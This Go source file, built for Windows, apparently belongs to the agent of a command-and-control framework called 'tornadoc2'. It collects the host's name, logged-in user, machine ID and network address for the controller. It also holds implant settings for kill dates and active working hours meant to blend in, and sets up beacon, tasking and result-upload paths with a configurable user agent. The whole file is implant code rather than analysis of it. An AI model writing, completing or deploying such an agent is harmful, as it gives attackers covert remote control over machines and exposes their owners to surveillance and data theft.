//go:build windows

package core

import (
	"os"
	"os/user"
	"runtime"
	"time"
	"tornadoc2/agent/platform"
	"tornadoc2/agent/protocol"
)

func GatherIdentity(cfg Config) protocol.Identity {
	hostname, _ := os.Hostname()
	username := ""
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	role := cfg.IdentityRole
	if role == "" {
		role = IdentityRole
	}

	id := protocol.Identity{
		Hostname:     hostname,
		Username:     username,
		MachineID:    platform.MachineID(),
		OS:           platformName,
		Arch:         runtime.GOARCH,
		Proto:        1,
		AgentVersion: cfg.AgentVersion,
		KillDays:     cfg.KillDays,
		WorkStart:    cfg.WorkHoursStart,
		WorkEnd:      cfg.WorkHoursEnd,
		IdentityRole: role,
		LocalAddr:    localOutboundAddr(),
	}
	fillIdentityExtra(&id)
	return id
}
func insideWorkHours(now time.Time) bool {
	if protocol.WorkHoursStart == protocol.WorkHoursEnd {
		return true
	}
	cur := now.Hour()*60 + now.Minute()
	if protocol.WorkHoursStart < protocol.WorkHoursEnd {
		return cur >= protocol.WorkHoursStart && cur < protocol.WorkHoursEnd
	}
	return cur >= protocol.WorkHoursStart || cur < protocol.WorkHoursEnd
}
func defaultProfile() protocol.Profile {
	ua := defaultUserAgent
	return protocol.Profile{
		UserAgent:    ua,
		BeaconPath:   "/beacon",
		TasksPath:    "/tasks",
		ResultsPath:  "/results",
		ExtraHeaders: map[string]string{},
	}
}
